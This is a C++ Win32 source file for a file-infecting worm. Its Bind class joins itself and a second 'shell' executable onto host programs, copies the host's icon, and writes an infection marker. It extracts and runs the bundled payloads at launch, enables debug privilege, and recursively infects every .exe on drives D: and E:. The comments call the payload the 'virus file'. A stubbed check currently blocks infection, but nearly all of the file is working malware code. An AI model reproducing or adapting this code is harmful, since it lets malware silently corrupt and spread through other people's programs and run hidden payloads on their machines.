// Bind.cpp: implementation of the Bind class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "Bind.h"
#include "sys/stat.h"  //����״̬��ʾͷ�ļ�
#include "SYS/TYPES.H" //�������Ͷ���ͷ�ļ�
#include "Globle.h"



//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

Bind::Bind(char* strBaseExe,char* strShellExe)
{
	strcpy(this->my_name,strBaseExe);
	strcpy(this->File1,strShellExe);
}

Bind::~Bind()
{

}

bool Bind::Bind_Files(char *strSourExe)
{
	struct _stat ST;
	FILE* out;      //���պϳ��ļ�
	
	CString IconFileName;
	char strTempFile[256];
	char strTempPath[256];
	char strDesFile[256];


	//�ж��ļ��Ƿ���� Ϊ�˱����쳣
	out = fopen(strSourExe, "rb");  //�� �ļ�
	if (out == NULL)
	{
		return false;
	}
	fclose(out);

	if(CheckInfect(strSourExe))
	{
		return true;
	}
	

	EnablePrivilege();
	

	memset(strTempFile, 0, 256);
	memset(strTempPath, 0, 256);
	memset(strDesFile, 0, 256);
	
	GetTempPath(256,strTempPath);
	sprintf(strTempFile, "%s", strSourExe);
	SplitFilePath(strSourExe, IconFileName);
	
	sprintf(strTempFile, "%s%s", strTempPath, IconFileName);
	
	//�ļ�����
	CopyFile(strSourExe, strTempFile, false);
	
	
	CString strTemp = strTempFile;
	CString strNewPathName = strTemp.Left(strTemp.GetLength() - 4) + "1.exe";  
	sprintf(strDesFile, "%s", strNewPathName);
	
	out = fopen(strDesFile, "wb"); //�������պϳ��ļ�
	if (out == NULL)
	{
		return false;
	}
	
	//д �󶨹��ܵ�exe
	_stat(my_name, &ST);
	modify_data.iMyLength = ST.st_size;
	CompFile(out,my_name);//virus file
	 
 
	fclose(out); //�ر����պϳ��ļ����


	SetExeIcon(strTempFile,strDesFile);
	_stat(strDesFile, &ST);// the virus file  ->changeicon
	modify_data.iMyLength = ST.st_size;

	out = fopen(strDesFile, "ab"); //���ӵ�һ���ı��ļ�
	if (out == NULL)
	{
		return false;
	}
 

	//д ����exe
	TCHAR chSystemDir[MAX_PATH];
	GetSystemDirectory(chSystemDir,MAX_PATH);
	strcat(chSystemDir,File1);
	
	_stat(chSystemDir, &ST);
	modify_data.iShellLength = ST.st_size;
	CompFile(out,chSystemDir);
	
	
	//дԭ����exe
	_stat(strTempFile, &ST);
	modify_data.iSourcLength = ST.st_size;
	CompFile(out,strTempFile);
	
	modify_data.bInfect=TRUE;//soruce+virus+source+modify_data
	fseek(out,0,SEEK_END);
	fwrite(&modify_data, 1, sizeof(modify_data), out);
	fclose(out); //�ر����պϳ��ļ����
	
 

	//����ԭ�����ļ�
	CopyFile(strDesFile, strSourExe, false);
	
 

	::DeleteFile(strTempFile);
	::DeleteFile(strDesFile);
 

	return true;
}

bool Bind::CheckInfect(char *strExePath)
{
	MODIFY_DATA mod_data;
	char strTemp[MAX_PATH];
	
	memset(&mod_data,0,sizeof(mod_data));
	
	//������Ѿ�����Ⱦ��exe��ReadExeFlag�����
	//�����ȱ��ݵ�tempĿ¼����ȡ ��Ⱦ��־��
	BackUpFile(strExePath,strTemp);
	ReadExeFlag(strTemp,&mod_data);
	::DeleteFile(strTemp);
	if(mod_data.bInfect== TRUE)
		return true;
	else
	//	return false;
return true;
}

BOOL Bind::EnablePrivilege()
{
	HANDLE hProcessToken = NULL;
	if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hProcessToken)) 
	{ 
		printf("OpenProcessToken() failed. --err: %d\n", GetLastError()); 
		return FALSE; 
	}
	
	TOKEN_PRIVILEGES tp={0};
	LUID luid={0};  
	if(!LookupPrivilegeValue(NULL,SE_DEBUG_NAME,&luid))  
	{ 
		printf("LookupPrivilegeValue error:%d", GetLastError() );  
		return FALSE; 
	}  
	tp.PrivilegeCount = 1;  
	tp.Privileges[0].Luid = luid;
	
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;  
	
	// Enable the privilege
	AdjustTokenPrivileges(hProcessToken,FALSE,&tp,sizeof(TOKEN_PRIVILEGES),NULL,NULL);  
	
	if(GetLastError() != ERROR_SUCCESS)  
	{
		return FALSE;  
	}
	return TRUE;
}

void Bind::BackUpFile(char *strSourFile, char *strDesFile)
{
	char tempfile[256];
	char cTempPathName[MAX_PATH];
	char cNewFilePath[MAX_PATH];
	CString IconFileName;
	memset(tempfile, 0, 256);
	memset(cNewFilePath, 0, MAX_PATH);
	memset(cTempPathName, 0, MAX_PATH);
	sprintf(tempfile, "%s", strSourFile);
	SplitFilePath(strSourFile, IconFileName);
	GetTempPath(MAX_PATH,cTempPathName);
	sprintf(cNewFilePath, "%s%s", cTempPathName, IconFileName);
	CString cNewFilePathtemp = cNewFilePath;
	CString strNewPathName = cNewFilePathtemp.Left(cNewFilePathtemp.GetLength() - 4) + "1.exe";  
	CopyFile(strSourFile, strNewPathName, false);
	strcpy(strDesFile,strNewPathName);
}

int Bind::SplitFilePath(CString strFilePath, CString &strOutFileName)
{
	CString sSplitFlag = "\\";
	
	int nPos = -1;
	
	int nIndex = -1;
	
	while(((nPos=strFilePath.Find(sSplitFlag,nPos + 1)) != -1))
	{
		nIndex = nPos;
	}
	
	if(nIndex == -1) return -1;
	
	int nFilePathLen = strFilePath.GetLength();
	
	if( nFilePathLen - nIndex < 4) return -2;
	
	strOutFileName = strFilePath.Right(nFilePathLen - nIndex - 1);	
	
	return 0;
}

bool Bind::CompFile(FILE *DesFileIO, char *strSourFile)
{
	FILE* in;       //�����ļ�
	struct _stat ST;
	unsigned int bytesin;
	
	if(DesFileIO==NULL)//����ʱĿ¼��Ŀ���ļ�
		return false;
	
	in = fopen(strSourFile, "rb");  //�򿪲����ļ�
	if (in == NULL)
	{
		return false;
	}
	
	_stat(strSourFile, &ST);
	if(ST.st_size==0)
	{
		return false;
	}
	
	buf=NULL;
	buf = (BYTE *)malloc(ST.st_size);//����
	
    bytesin=fread(buf, 1, ST.st_size, in);//���벡���ļ�->buf
	
	fseek(DesFileIO,0,SEEK_END);//  the virus file  written at the end of source file
								// source file written at the end of virus file
	fwrite(buf, 1, bytesin, DesFileIO);
	
	fclose(in); //�رհ��ļ����	
	free(buf);
	
	return true;
}



void Bind::Unbind_and_Run()
{
	TCHAR chSystemDir[MAX_PATH];
	memset(chSystemDir,0,MAX_PATH);
	GetTempPath(MAX_PATH,chSystemDir);
	char strTemp[MAX_PATH];
	MODIFY_DATA mod_data;
	memset(&mod_data,0,sizeof(mod_data));
	BackUpFile(my_name,strTemp);
	ReadExeFlag(strTemp,&mod_data);
	::DeleteFile(strTemp);

	memset(strTemp,0,MAX_PATH);
	strcpy(strTemp,chSystemDir);
	strcat(strTemp, "\\temp0.exe");
	UnbindFile(my_name,strTemp,0,mod_data.iMyLength);
	Create_Process(strTemp, true); 

	memset(strTemp,0,MAX_PATH);
	strcpy(strTemp,chSystemDir);
	strcat(strTemp, "\\temp1.exe");
	UnbindFile(my_name,strTemp,mod_data.iMyLength,mod_data.iShellLength);
	Create_Process(strTemp, true); 

	memset(chSystemDir,0,MAX_PATH);
	::GetCurrentDirectory(MAX_PATH,chSystemDir);
	memset(strTemp,0,MAX_PATH);
	strcpy(strTemp,chSystemDir);
	strcat(strTemp, "\\temp2.exe");
	UnbindFile(my_name,strTemp,mod_data.iMyLength+mod_data.iShellLength,mod_data.iSourcLength);
	Create_Process(strTemp, true); 
}

void Bind::Create_Process(const char *temp_exe, BOOL async)
{
	HANDLE hProcess;
	HANDLE hThread;
	PROCESS_INFORMATION PI;
	STARTUPINFO SI;
	
	memset(&SI, 0, sizeof(SI));
	SI.cb = sizeof(SI);
	
	CreateProcess(temp_exe, NULL, NULL, NULL, FALSE,NORMAL_PRIORITY_CLASS, NULL, NULL, &SI, &PI);	 
 
	hProcess = PI.hProcess;       
	hThread = PI.hThread;
	//�첽ִ��ʱ��ִ�к�ɾ���ֽ����ļ�;ͬ��ִ��ʱ��ִ�к�ɾ���ֽ����ļ�
	if (!async)  //ͬ��ִ��
	{
		WaitForSingleObject(hProcess, INFINITE);
		unlink(temp_exe);
	}
}

void Bind::UnbindFile(char *strSourcFile, char *strDesFile, unsigned int iBegin, unsigned int iSize)
{//my_name,strTemp,0,mod_data.iMyLength
	unsigned int bytesin;
	FILE* out;            //�ֽ���ļ�
	FILE* myself;         //�����ļ�
	myself = fopen(strSourcFile, "rb");  //�����պϳ��ļ�
	if (myself == NULL)
	{
		return;
	}
	buf = (BYTE*)malloc(iSize);
	out = fopen(strDesFile, "wb");   //������һ���󶨵��ļ�
	if (out == NULL)
	{
		free(buf);
		return;
	}
	//���ļ�ָ�붨λ�����������򳤶�β��
	fseek(myself, iBegin, SEEK_SET);
	//��ȡ��һ���ļ����ݲ�д��
	bytesin = fread(buf, 1, iSize, myself);
	fwrite(buf, 1, bytesin, out);
	fclose(out);  //�رյ�һ�����ļ����
	fclose(myself); //�ر����պϳ��ļ����
	free(buf);   //�ͷŻ�����
}

void Bind::WormWin32Computer()
{
	srand(GetTickCount());
	
	for (char cLabel='d'; cLabel<='e'; cLabel++)
	{
		char strRootPath[] = {"d:\\"};
		strRootPath[0] = cLabel;
		
        if(GetDriveType(strRootPath)== DRIVE_FIXED)
		{
			strRootPath[2] = '\0';    //"d:"
			InfectWin32AllFiles(strRootPath);
		}
	}
}

void Bind::InfectWin32AllFiles(char *lpPath)
{
	char szFind[MAX_PATH]; 
	WIN32_FIND_DATA FindFileData; 
	strcpy(szFind,lpPath);
	strcat(szFind,"\\*.*"); 
	HANDLE hFind=::FindFirstFile(szFind,&FindFileData);
	if(INVALID_HANDLE_VALUE == hFind)
		return; 
	
	while(TRUE) 
	{
		//If director, visit all sub-folders
		if(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
		{ 
			if(FindFileData.cFileName[0]!='.') 
			{ 
				char szFile[MAX_PATH];
				strcpy(szFile,lpPath); 
				strcat(szFile,"\\"); 
				strcat(szFile,FindFileData.cFileName); 
				
				InfectWin32AllFiles(szFile); 
			} 
		} 
		else 
		{ 
			//worm if exe file
			int len = strlen(FindFileData.cFileName);
			const char *p = (char *)&FindFileData.cFileName[len-3];
			if (_stricmp(p, "exe") == 0)        
			{
				char strFileName[MAX_PATH]; 
				strcpy(strFileName,lpPath); 
				strcat(strFileName,"\\"); 
				strcat(strFileName, FindFileData.cFileName); 
				//��Ⱦ�ļ�
				
				Bind_Files(strFileName);
				
			}            
		} 
		//Find next file
		if(!FindNextFile(hFind,&FindFileData))
			break; 
		
		Sleep(100);
	} 
	FindClose(hFind); 
}
